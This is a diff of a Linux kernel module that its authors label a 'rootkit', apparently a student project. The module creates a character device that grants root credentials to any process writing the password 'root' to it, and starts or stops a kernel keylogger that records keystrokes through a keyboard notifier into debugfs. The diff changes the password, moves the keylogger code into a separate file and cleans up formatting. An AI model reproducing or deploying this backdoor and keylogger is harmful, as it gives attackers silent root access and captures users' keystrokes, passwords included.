@@ -25,8 +25,6 @@
 #include <linux/input.h>
 
 #include "logger.c"
-//#include <include/fcntl.h>
-
 
 // *********************************************************************
 // module metadata and get rid of taint message
@@ -37,12 +35,11 @@ MODULE_LICENSE("GPL");
 #define DRIVER_AUTHOR "Alex&Andrew"
 #define DRIVER_DESC   "rootkit"
 
-
 MODULE_AUTHOR(DRIVER_AUTHOR);
 MODULE_DESCRIPTION(DRIVER_DESC);
 
 // *********************************************************************
-// prototypes
+// function prototypes
 // *********************************************************************
 static int 	__init init_main(void);
 static void __exit cleanup(void);
@@ -51,6 +48,8 @@ static int     dev_open  (struct inode *inode, struct file *f);
 static ssize_t dev_read  (struct file *f, char *buf, size_t len, loff_t *off);
 static ssize_t dev_write (struct file *f, const char __user *buf, size_t len, loff_t *off);
 static int dev_release(struct inode *inodep, struct file *filep);
+
+// defined in logger.c
 static int run_keylogger(void);
 static int exit_keylogger(void);
 
@@ -71,11 +70,10 @@ static int exit_keylogger(void);
 
 static unsigned long *sys_call_table;
 
-static int            majorNumber;
-static struct class*  rootcharClass		= NULL;
-static struct device* rootcharDevice	= NULL;
-static int    				numberOpens 		= 0;
-
+static int majorNumber;
+static struct class* rootcharClass = NULL;
+static struct device* rootcharDevice = NULL;
+static int numberOpens = 0;
 
 static struct file_operations fops =
 {
@@ -87,7 +85,7 @@ static struct file_operations fops =
 };
 
 // *********************************************************************
-// functions
+// functions definitions
 // *********************************************************************
 
 // changes permission of device to allow to rw
@@ -147,16 +145,17 @@ static int dev_open (struct inode *inode, struct file *f)
 // called each time data is sent from the device to user space
 static ssize_t dev_read (struct file *f, char *buf, size_t len, loff_t *off)
 {
+  static char  message[] = "Hello, this is a message from the kernel";
+  int error_count = 0;
+
 	printk ("Device read\n");
-	static char   message[] = "Hello, this is a message from the kernel";
-	static short  size_of_message = sizeof(message);
-	int error_count = 0;
+
    // copy_to_user has the format ( * to, *from, size) and returns 0 on success
-   error_count = copy_to_user(buf, message, size_of_message);
+   error_count = copy_to_user(buf, message, (int)sizeof(message));
 
    if (error_count==0){
-      printk(KERN_INFO "User read %d characters\n", size_of_message);
-      return (size_of_message=0);
+      printk(KERN_INFO "User read %d characters\n", (int)sizeof(message));
+      return (sizeof(message));
    }
    else {
       printk(KERN_INFO "EBBChar: Failed to send %d characters to the user\n", error_count);
@@ -173,12 +172,15 @@ static ssize_t dev_read (struct file *f, char *buf, size_t len, loff_t *off)
 // it will change the user's id to root
 static ssize_t dev_write (struct file *f, const char __user *buf, size_t len, loff_t *off)
 {
+  static char pass[] = "root";
+  static char logger[] = "keylogger";
+  static char exitlogger[] = "exitkeylogger";
+  struct cred *new_cred;
+  int err_code;
+
 	printk ("Device write\n");
-	char   magic[] = "CS493";
-	char   logger[] = "keylogger";
-	char exitlogger[] = "exitkeylogger";
-	struct cred *new_cred;
-	if (memcmp(buf, magic, (int)sizeof(magic)-1) == 0) 	// compares data and magic
+
+	if (memcmp(buf, pass, (int)sizeof(pass)-1) == 0) 	// compares data and magic
 	{
 		// changes old creds to root
 		if ((new_cred = prepare_creds ()) == NULL)					// gets current creds
@@ -196,7 +198,8 @@ static ssize_t dev_write (struct file *f, const char __user *buf, size_t len, lo
 	else if(memcmp(buf, logger, (int)sizeof(logger)-1) == 0)
 	{
 		printk("Keylogger activated\n");
-		run_keylogger();
+		err_code = run_keylogger();
+    printk("Keylogger code:%d\n",err_code);
 	}
 	else if(memcmp(buf, exitlogger, (int)sizeof(logger)-1) == 0)
 	{
@@ -205,41 +208,6 @@ static ssize_t dev_write (struct file *f, const char __user *buf, size_t len, lo
 	}
 	return len;
 }
-///dev/input/event2
-static int run_keylogger(void)
-{
-
-	if (codes < 0 || codes > 2)
-		return -EINVAL;
-
-	subdir = debugfs_create_dir("lkmr", NULL);
-	if (IS_ERR(subdir))
-		return PTR_ERR(subdir);
-	if (!subdir)
-		return -ENOENT;
-
-	file = debugfs_create_file("keys", 0400, subdir, NULL, &keys_fops);
-	if (!file) {
-		debugfs_remove_recursive(subdir);
-		return -ENOENT;
-	}
-
-	/*
-	 * Add to the list of console keyboard event
-	 * notifiers so the callback keysniffer_cb is
-	 * called when an event occurs.
-	 */
-	register_keyboard_notifier(&keysniffer_blk);
-	return 0;
-}
-
-static int exit_keylogger(void)
-{
-	unregister_keyboard_notifier(&keysniffer_blk);
-	debugfs_remove_recursive(subdir);
-}
-
-
 
 // Called when the device is closed in user space.
 static int dev_release(struct inode *inodep, struct file *filep)
